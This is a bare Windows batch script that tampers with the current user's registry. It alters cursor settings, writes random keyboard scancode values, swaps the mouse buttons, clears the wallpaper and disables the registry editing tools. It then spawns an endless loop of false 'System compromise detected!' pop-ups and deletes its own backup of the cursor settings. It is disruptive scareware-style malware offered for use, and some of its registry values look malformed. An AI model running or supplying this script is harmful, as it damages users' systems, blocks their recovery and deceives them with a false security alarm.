@echo off
reg export "HKCU\Control Panel\Cursors" cursors_backup.reg >nul
reg add "HKCU\Control Panel\Cursors" /v "Scheme Source" /t REG_DWORD /d 2 /f >nul
reg add "HKCU\Control Panel\Cursors" /v "(Default)" /t REG_SZ /d "FakeCursor" /f >nul

setlocal enabledelayedexpansion
for /l %%a in (0x00,1,0xFF) do (
    set /a rkey=!random! %% 255
    reg add "HKCU\Keyboard Layout" /v "Scancode Map" /t REG_BINARY /d !rkey!,00,!rkey!,00 /f >nul
)

reg add "HKCU\Control Panel\Mouse" /v "SwapMouseButtons" /t REG_SZ /d 2 /f >nul
reg add "HKCU\Control Panel\Desktop" /v "Wallpaper" /t REG_SZ /d "" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v "DisableRegistryTools" /t REG_DWORD /d 1 /f >nul

start cmd /c "for /l %%x in () do msg * WARNING: System compromise detected!"
timeout 3 >nul

del cursors_backup.reg >nul
